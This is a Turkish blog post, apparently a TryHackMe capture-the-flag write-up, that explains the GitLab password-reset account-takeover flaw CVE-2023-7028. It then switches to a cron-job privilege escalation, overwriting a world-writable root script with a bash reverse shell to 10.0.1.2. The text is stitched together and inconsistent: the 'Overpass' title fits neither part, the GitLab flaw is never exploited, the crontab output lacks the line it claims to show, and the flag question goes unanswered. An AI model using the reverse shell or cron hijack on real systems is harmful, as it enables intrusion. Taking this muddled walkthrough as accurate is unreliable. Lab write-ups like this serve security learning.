---
title: "TryHackMe: Overpass"
author: b1lal
categories: [TryHackMe]
tags: [gitlab, cve, cve 2023-7028, bug bounty]
render_with_liquid: false
media_subpath: /images/tryhackme_overpass_1/
image:
  path: main.png
---

GitLab, yazılım geliştirme projelerinde kaynak kodu yönetimi, sürekli entegrasyon ve işbirliği için kapsamlı bir platform sağlayan, tanınmış ve yaygın olarak benimsenmiş web tabanlı bir depo yöneticisidir. Ocak 2024'te platform, `Community` ve `Enterprise Edition` sürümünde yetkisiz kullanıcıların, potansiyel olarak yönetici hesapları da dahil olmak üzere, mağdurun herhangi bir etkileşimi olmadan kullanıcı hesaplarını ele geçirmesine olanak tanıyan kritik bir güvenlik açığı tespit etti. Güvenlik açığı <a href="https://hackerone.com/reports/2293343" target="_blank" style="text-decoration: none; color: yellow;">asterion04</a> tarafından özel bir hata ödül programı aracılığıyla tespit edilmiş ve Kritik önem derecesi ve **CVE-ID 2023-7028** olarak atanmıştır.

<!-- [![TryHackMe Gitlab CVE 2023-7028](main.png){: width="750" height="750" .shadow}](https://tryhackme.com/room/gitlabcve20237028){: .center } -->


## Nasıl Çalışıyor ?

Güvenlik açığı, GitLab'ın parola sıfırlama sırasında e-posta doğrulamasını işleme biçimindeki bir hatadan kaynaklanıyordu. Bir saldırgan parola sıfırlama isteği sırasında iki e-posta adresi sağlayabilir ve sıfırlama kodu her iki adrese de gönderilir. Bu, saldırganın kullanıcının mevcut parolasını bilmese bile herhangi bir kullanıcının parolasını sıfırlamasına olanak tanıyordu.

<br>

### Etkilenen Versiyonlar
- 16.1 ➜ 16.1.5
- 16.2 ➜ 16.2.8
- 16.3 ➜ 16.3.6
- 16.4 ➜ 16.4.4
- 16.5 ➜ 16.5.5
- 16.6 ➜ 16.6.3
- 16.7 ➜ 16.7.1

<br>

### Etkisi

Başarılı bir saldırı, saldırganın kurbanın GitLab hesabını kontrol etmesini sağlayabilir. Bu da saldırganın kaynak kodu, işlem geçmişi ve kullanıcı kimlik bilgileri gibi hassas bilgileri çalmasına olanak sağlayabilir. Saldırgan, ele geçirdiği hesabı diğer kullanıcılara veya sistemlere karşı başka saldırılar başlatmak için de kullanabilir.

<br>

### Detaylı Teknik Açıklama

Bu güvenlik açığı, GitLab'ın `POST /users/password` API uç noktasında bulunuyordu ve parola sıfırlamaktan sorumluydu. Pentester, e-posta adresi doğrulamasındaki bir hatayı istismar ederek geçersiz formatlarla yapılan kontrolleri atlattı. Saldırgan tarafından kontrol edilen bir e-posta ile parola sıfırlama isteği gönderildiğinde, GitLab yanlışlıkla bir sıfırlama jetonu oluşturup bu geçersiz adrese gönderdi. Saldırganlar bu jetonu ele geçirerek geçerli bir hedef kullanıcının e-postasıyla birleştirip parola sıfırlama sürecini başlattı ve sonunda hesabı ele geçirdi.

GitLab'daki parola sıfırlama isteğine baktığımızda, `/users/password` uç noktasına bir istek gönderildiğini görebiliriz. Bu istek, `authenticity_token` ve e-posta adresini parametre olarak içerir. Eğer hedef kullanıcı ek bir ikincil e-posta adresi sağlarsa, parola sıfırlama jetonu bu adrese de gönderilir.

![alt text](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/0b1bcaad54f02ef517007536c9ff492f.png)


Güvenlik açığının nasıl çalıştığını daha iyi anlamak için <a href="https://gitlab.com/gitlab-org/gitlab-foss/-/commit/21f32835ac7ca8c7ef57a93746dac7697341acc0" target="_blank" style="text-decoration: none; color: cyan;">kaynak kod</a> değişikliğine bakabilirsiniz.

<br>

**spec/controllers/passwords_controller_spec.rb** dosyasında bulunan kod, giriş olarak birden fazla e-posta adresini kabul ediyordu. Ancak, bu e-postaların doğru kullanıcıya ait olup olmadığını doğrulayan bir e-posta doğrulama ve doğrulama mekanizmasına sahip değildi.

![spec/controllers/passwords_controller_spec.rb](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/20ade8839fb7db0e8a139ef10951bdc6.png)


<br>

Saldırganın hedef hesabı ele geçirmek için yalnızca form gönderimi sırasında `authenticity_token` ve hedef kişinin `e-posta adresine` ihtiyacı vardı.


<br>


## Nasıl Sömürülür ?

Güvenlik açığından faydalanmak bir pentester için basittir, yalnızca hedef e-posta adresi ile `/users/password` yöntemine bir API çağrısı gerektirir.


*Bu güvenlik açığını daha iyi anlamak için TryHackMe üzerinde bulunan GitLab zaafiyetini barındıran Ubuntu tabanlı bir makine kullanacağız.*

<br>
<br>
<br>
<br>
<br>

Bu challenge bizden iki soruya cevap vermemizi istiyor:
- Planlanan cronjob nedir ? (fullpath)
- **flag.txt** dosyasının içeriği nedir ?

Challenge'ı başlatıyoruz, birkaç dakika sonra başlıyor. 


## Cronjob Dosyasını Bulma

Burada ilk yaptığımız vakit kaybetmeden zamanlanmış görev olup olmadığını kontrol etmektir.


```console
┌──(user㉿ubuntu)-[~]
└─$ cat /etc/crontab  
# /etc/crontab: system-wide crontab  
# Unlike any other crontab you don't have to run the `crontab`  
# command to install the new version when you edit this file  
# and files in /etc/cron.d. These files also have username fields,  
# that none of the other crontabs do.  
```

<br>
<br>

Burada gözümüze doğrudan cleanup.sh dosyası çarpıyor. Bunu biraz daha detaylı inceleyelim.

```bash
*/1 * * * * root /tmp/cleanup.sh
```


## Crontab Dosyasının Özellikleri

### Zamanlama Bölümü (`*/1 * * * *`)

Crontab satırları, zamanlama bilgisi içeren **beş alandan** oluşur:


| Dakika (0-59) | Saat (0-23) | Gün (1-31) | Ay (1-12) | Hafta Günü (0-6, Pazar=0 veya 7) |
| :-----------: | :---------: | :--------: | :-------: | :------------------------------: |
|     `*/1`     |     `*`     |    `*`     |    `*`    |               `*`                |




<br>

- **`*/1`** → Her **1 dakikada bir** çalıştır.
- **`*` (diğerleri)** → **Her saat, her gün, her ay ve her hafta günü** çalıştır.

Bu nedenle, bu görev **her dakika çalışacaktır**.

---

### Kullanıcı Bölümü (`root`)

- **`root`** → Bu komut **root kullanıcısı** tarafından çalıştırılacaktır.
- `/etc/crontab` gibi sistem genelindeki crontab dosyalarında kullanıcı adı **belirtilmelidir**.

---

<br>

## Yetki Yükseltme

Şimdi bu dosyaya yazma hakkımızın olup olmadığını kontrol edelim.

```bash
┌──(user㉿ubuntu)-[~]
└─$ ls -l /tmp/cleanup.sh
-rwxrw-rw- 1 root root 36 Aug 25 2023 /tmp/cleanup.sh
```

Yazma hakkımızın olduğunu görüyoruz. Şimdi dosyanın içeriğini reverse shell alabileceğimiz şekilde değiştirelim.

```bash
┌──(user㉿ubuntu)-[~]
└─$ vim /tmp/cleanup.sh
```

```bash
#!/bin/bash

bash -i >& /dev/tcp/10.0.1.2/2828 0>&1
```
{: file="cleanup.sh" }

İlk challenge'ımızı başarıyla tamamladık. Bir sonra yazılarda görüşmek üzere.

![Challenge Finished](challenge-finish.png){: width="1000" height="700"}

<style>
.center img {
  display:block;
  margin-left:auto;
  margin-right:auto;
}
.wrap pre{
    white-space: pre-wrap;
}
</style>
